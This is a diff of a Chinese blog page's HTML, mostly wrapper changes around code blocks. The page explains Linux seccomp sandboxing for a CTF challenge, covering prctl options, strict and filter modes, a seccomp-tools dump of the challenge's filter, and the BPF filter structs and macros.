+<p><a class="link"  target="_blank" rel="noopener"  href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" >https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用seccomp_init,seccomp_rule_add,seccomp_load来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。<br>首先，要使用它需要有CAP_SYS_ADMIN权能，否则就要设置PR_SET_NO_NEW_PRIVS位，若不这样做非root用户使用这个程序时seccomp保护将会失效！设置了PR_SET_NO_NEW_PRIVS位后能保证seccomp对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行execve这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用ptctl也不能再把它禁用掉。</p>
 </blockquote>
 <p>在 include/linux/prctl.h 中找到 PR_SET_NO_NEW_PRIVS 常量对应的数值，正好是 38，因此也就对应上了上述题目中的第一个 prctl 语句。</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png'><img src="https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png" alt="Snipaste_2023-09-14_23-07-36.png"></p>
+<p class='item-img' data-src='https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png'><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png"
+                      alt="Snipaste_2023-09-14_23-07-36.png"
+                ><figcaption>Snipaste_2023-09-14_23-07-36.png</figcaption></figure></p>
 <p>接着看第二个options PR_SET_SECCOMP：</p>
 <blockquote>
 <p>Set the secure computing (seccomp) mode for the calling thread, </p>
 <p>to limit the available system calls.</p>
 </blockquote>
 <p>一句话，这个参数是用来设置 seccomp ，其实也就是设置沙箱是否开启。<br>常常与它在prctl出现的还有如下两个参数：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">SECCOMP_MODE_STRICT：<br>    the only system calls that the thread is permitted to make are <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>,<br>	<span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>,_<span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-params">(but not exit_group(<span class="hljs-number">2</span>))</span>, and <span class="hljs-title function_">sigreturn</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>. <br><br><span class="hljs-title function_">SECCOMP_MODE_FILTER</span> <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>：<br>    the system calls allowed are defined by a pointer to a Berkeley Packet <br>    Filter passed in arg3.  This argument is a pointer to <span class="hljs-keyword">struct</span> sock_fprog; <br>	it can be designed to filter arbitrary system calls and system call arguments.<br>  <br><span class="hljs-number">1</span>、SECCOMP_MODE*<span class="hljs-title function_">STRICT</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span>：<br>	允许线程进行的唯一系统调用是read（2），write（2），*<span class="hljs-built_in">exit</span>（2）（但不是exit_group（2））<br>    和sigreturn（2）。<br><br>2、<span class="hljs-title function_">SECCOMP_MODE_FILTER</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>：<br>    允许的系统调用由指向arg3中传递的Berkeley Packet Filter的指针定义。 <br>    这个参数是一个指向<span class="hljs-keyword">struct</span> sock_fprog的指针; 它可以设计为过滤任意系统调用和系统调用参数<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">SECCOMP_MODE_STRICT：<br>    the only system calls that the thread is permitted to make are <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>,<br>	<span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>,_<span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-params">(but not exit_group(<span class="hljs-number">2</span>))</span>, and <span class="hljs-title function_">sigreturn</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>. <br><br><span class="hljs-title function_">SECCOMP_MODE_FILTER</span> <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>：<br>    the system calls allowed are defined by a pointer to a Berkeley Packet <br>    Filter passed in arg3.  This argument is a pointer to <span class="hljs-keyword">struct</span> sock_fprog; <br>	it can be designed to filter arbitrary system calls and system call arguments.<br>  <br><span class="hljs-number">1</span>、SECCOMP_MODE*<span class="hljs-title function_">STRICT</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span>：<br>	允许线程进行的唯一系统调用是read（2），write（2），*<span class="hljs-built_in">exit</span>（2）（但不是exit_group（2））<br>    和sigreturn（2）。<br><br>2、<span class="hljs-title function_">SECCOMP_MODE_FILTER</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>：<br>    允许的系统调用由指向arg3中传递的Berkeley Packet Filter的指针定义。 <br>    这个参数是一个指向<span class="hljs-keyword">struct</span> sock_fprog的指针; 它可以设计为过滤任意系统调用和系统调用参数<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>上述英文大概说的是如果设置了 SECCOMP_MODE_STRICT 模式的话，系统调用只能使用 read, write,_exit 这三个。如果设置了 SECCOMP_MODE_FILTER 的话，系统调用规则就可以被 Berkeley Packet Filter（BPF） 的规则所定义，这玩意就是这里最最重点的东西了，这个东西文章后面说。<br>将这几个参数带入到prctl：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<br><span class="hljs-comment">//第一个参数要进行什么设置，第二个是设置为过滤模式，第三个参数就是过滤规则</span><br><span class="hljs-comment">//PR_SET_SECCOMP：控制程序去是否开启seccomp mode，</span><br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<br><span class="hljs-comment">//第一个参数要进行什么设置，第二个是设置为过滤模式，第三个参数就是过滤规则</span><br><span class="hljs-comment">//PR_SET_SECCOMP：控制程序去是否开启seccomp mode，</span><br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>其中SECCOMP_MODE_FILTER 可以用常量表示为 2，回到之前的题，在第二个 prctl 函数中执行的就是：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2</span>, &amp;v1);<br><span class="hljs-comment">//IDA中反编译的不准确，其实&amp;v0代表的就是过滤规则</span><br><span class="hljs-comment">//22应该对应的是表示seccomp mode是开启状态（这个不太确定，因为我没有翻源码）</span><br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2</span>, &amp;v1);<br><span class="hljs-comment">//IDA中反编译的不准确，其实&amp;v0代表的就是过滤规则</span><br><span class="hljs-comment">//22应该对应的是表示seccomp mode是开启状态（这个不太确定，因为我没有翻源码）</span><br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>上面v1所储存的内容表示设置沙箱规则，从而可以实现改变函数的系统调用（通行或者禁止）：我们在IDA中具体看一下v1所定义的规则：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">08048640</span> <span class="hljs-number">20</span>                            unk_8048640 db  <span class="hljs-number">20</span>h                     ; DATA XREF: orw_seccomp+<span class="hljs-number">17</span>↑o<br>.rodata:<span class="hljs-number">08048641</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048642</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048643</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048644</span> <span class="hljs-number">04</span>                            db    <span class="hljs-number">4</span><br>.rodata:<span class="hljs-number">08048645</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048646</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048647</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048648</span> <span class="hljs-number">15</span>                            db  <span class="hljs-number">15</span>h<br>.rodata:<span class="hljs-number">08048649</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864</span>A <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864B</span> <span class="hljs-number">09</span>                            db    <span class="hljs-number">9</span><br>.rodata:<span class="hljs-number">0804864</span>C <span class="hljs-number">03</span>                            db    <span class="hljs-number">3</span><br>.rodata:<span class="hljs-number">0804864</span>D <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864</span>E <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864F</span> <span class="hljs-number">40</span>                            db  <span class="hljs-number">40</span>h ; @<br>.rodata:<span class="hljs-number">08048650</span> <span class="hljs-number">20</span>                            db  <span class="hljs-number">20</span>h<br>.rodata:<span class="hljs-number">08048651</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048652</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048653</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048654</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048655</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048656</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048657</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048658</span> <span class="hljs-number">15</span>                            db  <span class="hljs-number">15</span>h<br>.rodata:<span class="hljs-number">08048659</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804865</span>A <span class="hljs-number">07</span>                            db    <span class="hljs-number">7</span><br>.rodata:<span class="hljs-number">0804865B</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804865</span>C AD                            db <span class="hljs-number">0</span>ADh<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">08048640</span> <span class="hljs-number">20</span>                            unk_8048640 db  <span class="hljs-number">20</span>h                     ; DATA XREF: orw_seccomp+<span class="hljs-number">17</span>↑o<br>.rodata:<span class="hljs-number">08048641</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048642</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048643</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048644</span> <span class="hljs-number">04</span>                            db    <span class="hljs-number">4</span><br>.rodata:<span class="hljs-number">08048645</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048646</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048647</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048648</span> <span class="hljs-number">15</span>                            db  <span class="hljs-number">15</span>h<br>.rodata:<span class="hljs-number">08048649</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864</span>A <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864B</span> <span class="hljs-number">09</span>                            db    <span class="hljs-number">9</span><br>.rodata:<span class="hljs-number">0804864</span>C <span class="hljs-number">03</span>                            db    <span class="hljs-number">3</span><br>.rodata:<span class="hljs-number">0804864</span>D <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864</span>E <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864F</span> <span class="hljs-number">40</span>                            db  <span class="hljs-number">40</span>h ; @<br>.rodata:<span class="hljs-number">08048650</span> <span class="hljs-number">20</span>                            db  <span class="hljs-number">20</span>h<br>.rodata:<span class="hljs-number">08048651</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048652</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048653</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048654</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048655</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048656</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048657</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048658</span> <span class="hljs-number">15</span>                            db  <span class="hljs-number">15</span>h<br>.rodata:<span class="hljs-number">08048659</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804865</span>A <span class="hljs-number">07</span>                            db    <span class="hljs-number">7</span><br>.rodata:<span class="hljs-number">0804865B</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804865</span>C AD                            db <span class="hljs-number">0</span>ADh<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>好家伙，我直接看不懂。但是其实这些内容已经在前面出现过：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>    <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>    <br></code></pre></td></tr></tbody></table></figure></div>
 
 <blockquote>
 <p>从图中可以看出现在只有open、write、read、sigreturn这四个系统调用可以使用。<br>对照一下，是不是一模一样？但是这些内容又意味这什么？上面的line、CODE、JT、JF、K又是什么意思？</p>
@@ -357,28 +681,28 @@
 <hr>
 <p>简单的说BPF定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器（RegA），和赋值、算术、跳转指令。一条指令由一个定义好的结构struct bpf_insn表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。</p>
 <p>&amp;prog是指向如下结构体的指针，这个结构体记录了过滤规则个数与规则数组起始位置:</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> &#123;</span><br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>      len;    <span class="hljs-comment">/* Number of BPF instructions */</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span> <span class="hljs-comment">/* Pointer to array of BPF instructions */</span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> &#123;</span><br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>      len;    <span class="hljs-comment">/* Number of BPF instructions */</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span> <span class="hljs-comment">/* Pointer to array of BPF instructions */</span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>而filter域就指向了具体的规则，每一条规则有如下形式：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> &#123;</span>            <span class="hljs-comment">/* Filter block */</span><br>    __u16 code;                 <span class="hljs-comment">/* Actual filter code */</span><br>    __u8  jt;                   <span class="hljs-comment">/* Jump true */</span><br>    __u8  jf;                   <span class="hljs-comment">/* Jump false */</span><br>    __u32 k;                    <span class="hljs-comment">/* Generic multiuse field */</span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> &#123;</span>            <span class="hljs-comment">/* Filter block */</span><br>    __u16 code;                 <span class="hljs-comment">/* Actual filter code */</span><br>    __u8  jt;                   <span class="hljs-comment">/* Jump true */</span><br>    __u8  jf;                   <span class="hljs-comment">/* Jump false */</span><br>    __u32 k;                    <span class="hljs-comment">/* Generic multiuse field */</span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>为了操作方便定义了一组宏来完成filter的填写(定义在/usr/include/linux/bpf_common.h)：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BPF_STMT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_STMT(code, k) &#123; (unsigned short)(code), 0, 0, k &#125;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BPF_JUMP</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_JUMP(code, k, jt, jf) &#123; (unsigned short)(code), jt, jf, k &#125;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></tbody></table></figure>
